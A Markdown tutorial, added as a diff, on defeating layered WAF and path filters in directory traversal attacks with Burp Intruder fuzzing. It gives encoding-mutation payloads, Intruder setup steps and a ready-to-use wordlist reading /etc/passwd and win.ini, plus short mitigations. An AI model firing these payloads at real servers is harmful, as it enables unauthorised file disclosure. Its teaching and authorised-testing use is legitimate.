@@ -1,0 +1,188 @@
+# Directory Traversal: Bypassing Extreme Filtering with Burp Intruder & Automated Fuzzing
+
+In advanced penetration testing engagements, red team operations, and CTF challenges, security testers frequently encounter **Extreme Filtering**—architectures where multiple defensive layers are deployed simultaneously:
+1. **Web Application Firewalls (WAFs)** blocking standard `../` and `%2e%2e%2f` signatures.
+2. **Reverse Proxies / Load Balancers** performing partial decoding and path normalization.
+3. **Backend Middleware** stripping non-recursive sequences (`....//`).
+4. **Application Validation Logic** enforcing directory prefixes (`/var/images/`) and file extensions (`.png`).
+
+Manually crafting and evaluating hundreds of mutation payload combinations through Burp Repeater is inefficient and error-prone. This is where **Burp Suite Intruder** and **Automated Fuzzing** become the primary methodology to identify the exact mutation payload that bypasses all security layers.
+
+---
+
+## 1. Vulnerability Concept: Why Does Extreme Filtering Require Fuzzing?
+
+Multi-tier architectures suffer from **Parser Mismatch Discrepancies**—differences in how WAFs, web servers, backend runtimes, and operating system kernels decode and interpret input:
+
+```text
+[Client / Attacker]
+       │ (Complex Mutation Payload)
+       ▼
+[ WAF Layer (Cloudflare/AWS) ] ── (Inspects encoded payload, sees no raw ../)
+       │ (Passes)
+       ▼
+[ Reverse Proxy (Nginx) ] ────── (Executes Pass 1 Decode)
+       │
+       ▼
+[ Backend Framework (Java/Node)] (Executes Unicode Normalization / Single-pass Strip)
+       │
+       ▼
+[ OS Filesystem Kernel (POSIX) ] (Executes genuine traversal to /etc/passwd!)
+```
+
+Because external testers cannot determine the exact internal decoding order in advance, **targeted mutation fuzzing** systematically discovers the specific payload structure that satisfies every intermediary component.
+
+---
+
+## 2. Exploitation Flow: Fuzzing with Burp Intruder
+
+![Directory Traversal Intruder Fuzzing](/images/directory-traversal-intruder-fuzzing.svg)
+
+---
+
+## 3. Mutation Payload Matrix for Extreme Filtering
+
+Here are the essential mutation categories to include in an automated fuzzing wordlist:
+
+---
+
+### Category 1: Multi-Layer URL Encoding
+Targeting reverse proxies or API gateways that decode parameters before forwarding them to the backend:
+- **Single URL Encode:** `%2e%2e%2f` or `%2e%2e/`
+- **Double URL Encode:** `%252e%252e%252f` or `..%252f`
+- **Triple URL Encode:** `%25252e%25252e%25252f`
+
+---
+
+### Category 2: 16-Bit Unicode, Overlong UTF-8, & Normalization
+Circumventing regex-based WAF filters that fail to handle multi-byte character representations:
+- **16-Bit Unicode:** `%u002e%u002e%u002f` or `%u002e%u002e%u2215` (Division slash)
+- **Overlong UTF-8 (2-Byte):** `%c0%ae%c0%ae%c0%af`
+- **Overlong UTF-8 (3-Byte):** `%e0%80%ae%e0%80%ae%e0%80%af`
+- **Unicode Fullwidth Normalization:** `\uFF0E\uFF0E\uFF0F` (Fullwidth dots normalized to `..` by runtime normalizers *after* passing regex checks).
+
+---
+
+### Category 3: Mixed Slashes & Windows NTFS Obfuscation
+Targeting Windows environments or frameworks supporting dual path separators:
+- **Mixed Separators:** `..\..\..\etc\passwd` or `..\/..\/..\etc/passwd`
+- **URL-Encoded Mixed:** `..%5c..%5c` or `%2e%2e%5c%2e%2e%2f`
+- **NTFS Stream Suffix:** `..\..\windows\win.ini::$DATA` or `..\..\boot.ini...`
+
+---
+
+### Category 4: Hybrid Mutation (Extreme Combinations)
+Combining multiple evasion techniques (Prefix + Nested + Encoding + Null Byte):
+```text
+/var/www/images/....//....//%252e%252e/etc/passwd%00.jpg
+/var/www/images/..%252f..%252f..%252fetc/passwd?.png
+/images/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%23.jpg
+```
+
+---
+
+## 4. Step-by-Step Practical Exploitation with Burp Suite Intruder
+
+Follow this protocol to execute automated Directory Traversal fuzzing:
+
+---
+
+### Step 1: Intercept Request & Send to Intruder
+1. Access the target application via the embedded **Burp Suite** browser.
+2. Locate the file retrieval request in **Proxy** > **HTTP history** (`GET /image?filename=default.png`).
+3. Right-click the request and choose **Send to Intruder** (`Ctrl + I` / `Cmd + I`).
+4. Switch to the **Intruder** tab.
+
+---
+
+### Step 2: Set Payload Position (Sniper Marker §)
+1. Navigate to the **Positions** sub-tab.
+2. Choose Attack Type: **Sniper** (fuzzes a single insertion point sequentially).
+3. Mark the `filename` parameter value with `§` markers:
+   ```http
+   GET /image?filename=§default.png§ HTTP/1.1
+   Host: target-lab.com
+   Cookie: session=xyz...
+   ```
+
+---
+
+### Step 3: Load the Traversal Wordlist
+1. Navigate to the **Payloads** sub-tab.
+2. Under **Payload settings [Simple list]**:
+   - Click **Load...** and select a standard directory traversal wordlist (such as `SecLists/Fuzzing/traversal.txt`).
+   - Or paste custom mutation payloads directly into the list.
+
+---
+
+### Step 4: Configure Payload Encoding (CRITICAL ⚠️)
+1. Scroll down on the **Payloads** sub-tab to the **Payload Encoding** section.
+2. **UNCHECK** the following option:
+   ```text
+   [ ] URL-encode these characters: ...
+   ```
+> [!WARNING]
+> **IMPORTANT:** If left enabled, Burp Suite will automatically URL-encode the `%` symbol in double-encoded payloads (`%252e` becomes `%25252e`), corrupting pre-encoded mutation payloads before they reach the server!
+
+---
+
+### Step 5: Configure Grep - Match for Automatic Detection
+1. Navigate to the **Settings** sub-tab (or **Options** in older versions).
+2. Scroll to the **Grep - Match** section.
+3. Click **Add** and insert signature patterns indicating successful file disclosure:
+   - `root:x:0:0:` (Linux `/etc/passwd` signature)
+   - `[extensions]` or `[fonts]` (Windows `win.ini` signature)
+   - `daemon:x`
+   - `/bin/bash`
+4. Verify **Match type: Simple string** is selected.
+
+---
+
+### Step 6: Execute the Attack (Start Attack)
+1. Click **Start attack** in the top-right corner.
+2. The Intruder Attack window opens and executes requests automatically.
+
+---
+
+### Step 7: Analyze Attack Results & Identify Winning Payload
+1. In the results window, inspect the following columns:
+   - **Grep - Match Column:** Look for rows flagged with `[✓]`.
+   - **Status Column:** Filter for `200 OK` status codes.
+   - **Length Column:** Sort by response length. Successful file disclosures exhibit response lengths distinct from generic 400/404 errors.
+2. Click the flagged `[✓]` row.
+3. Inspect the **Response** panel to verify that `/etc/passwd` has been extracted!
+
+---
+
+## 5. Ready-to-Use Fuzzing Wordlist
+
+Here are 15 high-impact mutation payloads for immediate testing:
+
+```text
+/etc/passwd
+/etc/passwd%00.png
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../../etc/passwd
+....//....//....//etc/passwd
+....//....//....//etc/passwd%00.png
+..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd%00.jpg
+/var/www/images/../../../etc/passwd
+/var/www/images/....//....//....//etc/passwd
+/var/www/images/%252e%252e%252f%252e%252e%252fetc/passwd%00.png
+..%5c..%5c..%5cwindows/win.ini
+```
+
+---
+
+## 6. Comprehensive Mitigation Guidelines (Defense-in-Depth)
+
+1. **Verify Canonical Containment (`startsWith(BASE_DIR + path.sep)`):**
+   Normalize all paths using `path.resolve()` or `realpath()` and assert that target paths remain strictly inside the authorized base folder.
+2. **Apply Strict Alphanumeric Whitelists:**
+   Reject any input containing characters outside `[a-zA-Z0-9_-]`.
+3. **Implement Database UUID Mapping:**
+   Reference media files by randomized database keys rather than exposing filesystem paths directly to user control.
